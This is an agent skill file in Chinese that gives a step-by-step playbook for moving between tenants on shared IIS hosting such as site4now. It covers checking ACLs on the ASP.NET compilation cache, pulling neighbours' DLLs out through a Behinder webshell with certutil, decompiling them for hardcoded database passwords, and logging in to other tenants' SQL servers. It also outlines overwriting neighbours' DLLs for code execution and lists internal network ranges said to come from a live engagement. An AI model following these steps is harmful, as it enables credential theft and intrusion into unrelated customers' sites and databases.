---
name: shared-hosting-cross-tenant
description: "共享IIS主机跨租户横向: ASP.NET编译缓存ACL漏洞→读邻居DLL→提取连接串→打租户SQL。"
version: 1.0.0
metadata:
  hermes:
    tags: [pentest, shared-hosting, cross-tenant, iis, aspx, lateral]
---

# 共享 IIS 主机跨租户横向 (site4now 等)

## 触发条件
拿下共享主机某个租户的 IIS 应用池 RCE 后, 需要横向到**其他租户**或验证隔离边界。
典型环境: site4now 类共享托管, 每租户一个本地账号(xxx-001) + 独立应用池, 物理路径 h:\root\home\<租户>\www\。

## 侦察要点(只读)
- `net user` → 租户账号清单(300+ 是常态) → 确认共享主机身份
- `dir c:\inetpub\temp\apppools` → 全部租户应用池目录(可列!)
- `dir h:\root\home` 被拒 / 邻居 web.config 被拒 → 常规隔离是好的, 找"被认为不重要"的区域
- **`icacls "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\Root"`** ← 关键检查!
  - 安全时: Users 只读自己的
  - 配错时(实战命中): `BUILTIN\Users:(RX)` + `BUILTIN\IIS_IUSRS:(M,DC)` = 所有租户可读可改别人的编译缓存

## 只读链(2026-08 实战验证: uscrec→SFP 租户库)
1. 列出 Temp Root 哈希目录(每目录=一个租户 ASP.NET 应用), 搜连接串特征:
   `findstr /s /m /i "data source= 10.10.30. password= pwd=" Root\<dir>\*.dll` (分块扫, 别全树递归——超时)
2. **下载邻居 DLL 必须用 certutil 转 base64**: 冰蝎 Cmd 载荷的 execCMD 有 UTF-8 回环转换,
   `type` 直出二进制会被损坏。正确姿势:
   `certutil -encode <dll> <自己可写的Content\Uploads>\x.b64 & type x.b64 & del x.b64`
   (写自己的沙箱目录, 用完删)
3. 本地反编译: ICSharpCode.Decompiler 7.2.1.6856 (netstandard2.0, PS 5.1 可加载,
   依赖 System.Reflection.Metadata/5.0.0 + System.Collections.Immutable/5.0.0 + System.Memory/4.5.5 + System.Runtime.CompilerServices.Unsafe/5.0.0)
4. grep 反编译源码: `data source=` / `password=` / `DefaultSettingValue` / `ApiKey` / smtp
   → 硬编码连接串(含历史密码! 开发期配置全在 DefaultSettingValue 属性里)
5. 测试凭据: 租户 SQL 通常**公网 1433 可达**(或内网农场) → 泛化 SQL payload 或直接
   Navicat/mssqlclient 登录 → 表清单确认(只读, 别碰数据内容)

## 写链(跨租户 RCE, 需用户批准 — 涉及写他人文件)
IIS_IUSRS 有 (M,DC) → 覆盖邻居租户的编译缓存 DLL → 对方池回收/加载时执行我们的程序集。
收益: 读全部租户 web.config(硬编码之外的凭据) + 全部租户库。
代价: 搞坏邻居站点/留痕/触发杀软; **不提升权限**(应用池账号同级)。
除非目标=运营商级全租户收割, 否则只读链已够交差。

## site4now 实证情报(2026-08)
- 租户 SQL = `sql5xxx.site4now.net`(每租户独立实例, 公网 IP 可直连 1433, **强制 TLS**)
- 单租户实例隔离良好: 只看到自己的库, sa 禁用, xp_cmdshell/OLE/clr 全关 → 提权面小
- 内网管理网 10.10.28.0/22(ICMP 全灭, TCP 可通); SQL 农场 10.10.30.x(sql5063 等, netstat ESTABLISHED 暴露)
- 公网暴露: Web Deploy 8172(401 Basic realm=WebManagementService), WinRM 5985(仅内网)
- 大杀器组合: 跨租户读链 + 租户 SQL 公网裸奔 = "硬编码弱口令 + 公网可达"

## 红线
- 读邻居数据 = 只读(看表名/结构可以, 别批量导数据)
- 写链/爆破/复用测试(历史凭据跨机器测) = 必须用户批准
- 连通性测试用 Python socket, 禁止 curl telnet(假阴性, 见 webshell-http-tunnel skill)
